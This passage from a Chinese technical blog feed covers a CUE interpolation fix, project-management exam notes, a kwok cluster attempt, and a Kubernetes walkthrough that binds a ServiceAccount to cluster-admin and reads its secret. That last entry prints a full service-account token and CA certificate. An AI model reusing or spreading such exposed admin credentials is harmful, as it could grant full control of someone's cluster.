successfully<br></code></pre></td></tr></table></figure><p>然后会自动跳转到 <code>http://localhost:3000/</code></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/144885938">Node.js 开发环境安装之 Linux</a><br><a href="https://blog.csdn.net/maoge_666/article/details/136038003">npm报错：request to https://registry.npm.taobao.org failed, reason certificate has expired</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue语言系列】(202403) cue语法报错：illegal character U+005C</title>
    <link href="/2024/03/15/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20cue%E8%AF%AD%E6%B3%95%E6%8A%A5%E9%94%99%EF%BC%9Aillegal%20character%20U+005C/"/>
    <url>/2024/03/15/cue/%E3%80%90cue%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91(202403)%20cue%E8%AF%AD%E6%B3%95%E6%8A%A5%E9%94%99%EF%BC%9Aillegal%20character%20U+005C/</url>
    
    <content type="html"><![CDATA[<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">illegal character U+005C <span class="hljs-string">&#x27;\&#x27;</span><br>在编程和文本处理中，`U+005C` 是一个 Unicode 编码，它对应的是反斜杠字符（backslash），即 `\`。<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240315172255.png" alt="image.png"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;222&quot;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;333&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;444&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ARCH:</span> <span class="hljs-string">&quot;amd64&quot;</span><br><br>if ARCH == <span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> \(global.aaa)<br><span class="hljs-symbol">    bbb:</span> \(global.bbb)<br><span class="hljs-punctuation">&#125;</span><br>if ARCH == <span class="hljs-string">&quot;arm64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    ccc:</span> \(global.ccc)<br><span class="hljs-symbol">    ddd:</span> \(global.ddd)<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="解决：加上引号"><a href="#解决：加上引号" class="headerlink" title="解决：加上引号"></a>解决：加上引号</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240315172444.png"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">global:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;222&quot;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;333&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;444&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ARCH:</span> <span class="hljs-string">&quot;amd64&quot;</span><br><br><br>if ARCH == <span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    aaa:</span> <span class="hljs-string">&quot;\(global.aaa)&quot;</span><br><span class="hljs-symbol">    bbb:</span> <span class="hljs-string">&quot;\(global.bbb)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br>if ARCH == <span class="hljs-string">&quot;arm64&quot;</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    ccc:</span> <span class="hljs-string">&quot;\(global.ccc)&quot;</span><br><span class="hljs-symbol">    ddd:</span> <span class="hljs-string">&quot;\(global.ddd)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>[cue工具](<a href="https://cuelang.org/play/?example=test-example#w=function&i=cue&f=export&o=cue">CUE Playground | CUE (cuelang.org)</a>)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>notes</title>
    <link href="/2024/03/04/notes/notes/"/>
    <url>/2024/03/04/notes/notes/</url>
    
    <content type="html"><![CDATA[<h1 id="20240124"><a href="#20240124" class="headerlink" title="20240124"></a>20240124</h1><p>本题考查：项目质量管理-质量管理工具-帕累托图。<br>利用帕累托图，有利于确定影响质量的主次因素，使错综复杂的问题一目了然。</p><p>成本绩效指数小于1，所以当前本项目的成本超支， 成本超支了，那就表示与计划不符了，也就是无法按照计划完成。<br>在项目管理中，一个衡量成本绩效的指标是成本绩效指数（cost performance index, cpi)，它在衡量正在进行的项目的成本效率。<br>CPI值如果小于1则表示实际成本超出预算；CPI值如果大于1则表示实际成本低于预算。<br>成本绩效指数（CPI）&#x3D;EV&#x2F;AC</p><h1 id="20240127"><a href="#20240127" class="headerlink" title="20240127"></a>20240127</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127101004.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127105123.png" alt="image.png"></p><p>DoD：做到什么程度才算完成<br>DoR：准备到什么程度才能进入开发<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127110913.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127122703.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127120723.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240127122522.png" alt="image.png"></p><h1 id="20240303"><a href="#20240303" class="headerlink" title="20240303"></a>20240303</h1><p>快速跟进是指将正常情况下按顺序进行的活动或阶段改为至少是部分并行开展。<br>资源平衡是为了在资源需求与资源供给之间取得平衡，根据资源制约对开始日期和结束日期进行调整的一种技术。<br>关键链法允许项目团队在任何项目进度路径上设置缓冲，来应对资源限制和项目不确定性。<br>进度压缩技术是指在不缩减项目范围的前提下，缩短或加快进度工期，以满足进度制约因素、强制日期或其他进度目标。包括赶工和快速跟进。题干中增加额外资源和加班属于进度压缩中的赶工技术。</p><p>进度压缩：</p><ul><li>1）赶工</li><li>2）快速跟进</li></ul><p>CPI(成本绩效指数)</p><ul><li>小于1：实际成本超出预算</li><li>大于1：示实际成本低于预算。</li><li>CPI&#x3D;EV&#x2F;AC<br>·<br>SPI(进度绩效指数) </li><li>小于1：进度落后</li></ul><p>甘特图：<br>     时间表 持续时间 开始时间 截止时间<br>活动  x     x        x       x</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】kwok初体验</title>
    <link href="/2024/02/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kwok%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/02/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kwok%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/kwok/releases/download/v0.5.1/kwokctl-linux-amd64</span><br><span class="hljs-comment"># wget https://github.com/kubernetes-sigs/kwok/releases/download/v0.5.1/kwok-linux-amd64</span><br><br><br></code></pre></td></tr></table></figure><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kwokctl create cluster</span><br>Cluster is creating                                                                                                                                            cluster=kwok<br>Pull image                                                                                                                 image=registry.k8s.io/etcd:3.5.11-0 cluster=kwok<br>Error response from daemon: Head <span class="hljs-string">&quot;https://us-west2-docker.pkg.dev/v2/k8s-artifacts-prod/images/etcd/manifests/3.5.11-0&quot;</span>: dial tcp 108.177.125.82:443: i/o <span class="hljs-built_in">timeout</span><br>ERROR Failed to setup config                                                          err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/etcd:3.5.11-0: exit status 1&quot;</span> cluster=kwok<br>Cluster is cleaned up                                                                                                                                          cluster=kwok<br>ERROR Execute <span class="hljs-built_in">exit</span>                                                                                err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/etcd:3.5.11-0: exit status 1&quot;</span> <br><br><br><br><span class="hljs-comment"># docker pull bitnami/etcd:3.5.11</span><br>3.5.11: Pulling from bitnami/etcd<br>3bd5d758f760: Downloading [=====================================&gt;             ]  42.63MB/56.64MB<br>3bd5d758f760: Downloading [======================================&gt;            ]  43.16MB/56.64MB<br>3bd5d758f760: Pull complete <br>Digest: sha256:4b99cc7a8e7e49ca8a03fba7ae0b5e8913fe2576114ace1bef79166ef0bbe6bf<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> bitnami/etcd:3.5.11<br>docker.io/bitnami/etcd:3.5.11<br><br><br><span class="hljs-comment"># kwokctl create cluster --name demo --etcd-image bitnami/etcd:3.5.11</span><br>Cluster is creating                                                                                                    cluster=demo<br>Pull image                                                                image=registry.k8s.io/kube-apiserver:v1.29.0 cluster=demo<br>Error response from daemon: Head <span class="hljs-string">&quot;https://us-west2-docker.pkg.dev/v2/k8s-artifacts-prod/images/kube-apiserver/manifests/v1.29.0&quot;</span>: dial tcp 108.177.125.82:443: i/o <span class="hljs-built_in">timeout</span><br>ERROR Failed to setup config         err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/kube-apiserver:v1.29.0: exit status 1&quot;</span> cluster=demo<br>Cluster is cleaned up                                                                                                  cluster=demo<br>ERROR Execute <span class="hljs-built_in">exit</span>                               err=<span class="hljs-string">&quot;cmd wait: docker pull registry.k8s.io/kube-apiserver:v1.29.0: exit status 1&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(改时间202205) k8s中的 secret token</title>
    <link href="/2024/02/21/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(%E6%94%B9%E6%97%B6%E9%97%B4202205)%20k8s%E4%B8%AD%E7%9A%84%20secret%20token/"/>
    <url>/2024/02/21/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(%E6%94%B9%E6%97%B6%E9%97%B4202205)%20k8s%E4%B8%AD%E7%9A%84%20secret%20token/</url>
    
    <content type="html"><![CDATA[<p>生成kubernetes集群最高权限admin用户的token</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRoleBinding</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1beta1</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">rbac.authorization.kubernetes.io/autoupdate:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">roleRef:</span><br>  <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cluster-admin</span><br>  <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br><span class="hljs-attr">subjects:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ServiceAccount</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">admin</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">kubernetes.io/cluster-service:</span> <span class="hljs-string">&quot;true&quot;</span><br>    <span class="hljs-attr">addonmanager.kubernetes.io/mode:</span> <span class="hljs-string">Reconcile</span><br></code></pre></td></tr></table></figure><p>然后执行下面的命令创建 serviceaccount 和角色绑定，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl create -f admin-role.yaml<br></code></pre></td></tr></table></figure><p>创建完成后获取secret中token的值。</p><h1 id="获取admin-token的secret名字"><a href="#获取admin-token的secret名字" class="headerlink" title="获取admin-token的secret名字"></a>获取admin-token的secret名字</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl -n kube-system get secret|grep admin-token<br>admin-token-2qdsz                          kubernetes.io/service-account-token   3         6m<br></code></pre></td></tr></table></figure><h1 id="获取token的值"><a href="#获取token的值" class="headerlink" title="获取token的值"></a>获取token的值</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注意：token是base64解码后的值</span><br><span class="hljs-comment"># kubectl -n kube-system describe secret admin-token-2qdsz</span><br>Name:         admin-token-2qdsz<br>Namespace:    kube-system<br>Labels:       &lt;none&gt;<br>Annotations:  kubernetes.io/service-account.name: admin<br>              kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br><br>Type:  kubernetes.io/service-account-token<br><br>Data<br>====<br>ca.crt:     1359 bytes<br>namespace:  11 bytes<br>token:      eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ   <br><br><span class="hljs-comment"># 注意：token是base64编码后的值</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -oyaml</span><br>apiVersion: v1<br>data:<br>  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K<br>  namespace: a3ViZS1zeXN0ZW0=<br>  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br>kind: Secret<br>metadata:<br>  annotations:<br>    kubernetes.io/service-account.name: admin<br>    kubernetes.io/service-account.uid: 4fe95396-6de8-4097-9ff9-4232f0151c71<br>  creationTimestamp: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span><br>  name: admin-token-2qdsz<br>  namespace: kube-system<br>  resourceVersion: <span class="hljs-string">&quot;2962635&quot;</span><br>  selfLink: /api/v1/namespaces/kube-system/secrets/admin-token-2qdsz<br>  uid: 41e80ab2-3840-4cde-bad8-cdad915bbcc9<br><span class="hljs-built_in">type</span>: kubernetes.io/service-account-token<br><br><br></code></pre></td></tr></table></figure><p>也可以使用 jsonpath 的方式直接获取 token 的值，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;</span><br>ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br><br><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 -d</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 